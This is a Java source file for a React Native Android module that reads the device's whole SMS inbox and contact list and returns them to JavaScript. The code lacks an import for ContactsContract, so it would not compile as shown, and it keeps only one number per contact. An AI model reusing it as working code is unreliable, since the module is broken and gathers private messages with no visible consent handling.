package com.reduxthunkk;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.widget.Toast;

import androidx.annotation.NonNull;


import com.facebook.react.bridge.Promise;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;
import com.facebook.react.bridge.WritableArray;
import com.facebook.react.bridge.WritableMap;
import com.facebook.react.bridge.WritableNativeArray;
import com.facebook.react.bridge.WritableNativeMap;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class Main extends ReactContextBaseJavaModule {
    private static ReactApplicationContext reactContext;

    public Main(ReactApplicationContext context) {
        super(context);
        reactContext = context;
    }

    @NonNull
    @Override
    public String getName() {
        return "Main";
    }

    @ReactMethod
    public void show(String text) {
        Toast.makeText(reactContext, text, Toast.LENGTH_LONG).show();
    }


    @ReactMethod
    public void getSMS(Promise promise) {
        try {
            WritableArray sms = new WritableNativeArray();
            Uri uri = Uri.parse("content://sms/inbox");

            Cursor cursor = reactContext.getContentResolver().query(uri, null, null, null, null);
            while (cursor != null && cursor.moveToNext()) {
                WritableMap info = new WritableNativeMap();
                @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                info.putString("number", address);
                info.putString("message", body);
                sms.pushMap(info);
            }
            if (cursor != null) {
                cursor.close();
            }
            System.out.println(sms);
            promise.resolve(sms);
        } catch (Exception error) {
            promise.reject("Error", error);
        }
    }
    @SuppressLint("Range")
    @ReactMethod
    public void getContact(Promise promise) {
        try {
            WritableArray contact = new WritableNativeArray();
            Cursor cr = reactContext.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if ((cr != null ? cr.getCount() : 0) > 0) {
                while (cr != null && cr.moveToNext()) {
                    WritableMap info = new WritableNativeMap();
                    String id = cr.getString(cr.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cr.getString(cr.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    if (cr.getInt(cr.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = reactContext.getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                            info.putString("id", id);
                            info.putString("name", name);
                            info.putString("number", phoneNo);

                        }
                        pCur.close();
                    }
                    contact.pushMap(info);
                }
            }
            if (cr != null) {
                cr.close();
            }
            promise.resolve(contact);
        } catch (Exception error) {
            promise.reject("Error", error);
        }
    }


}
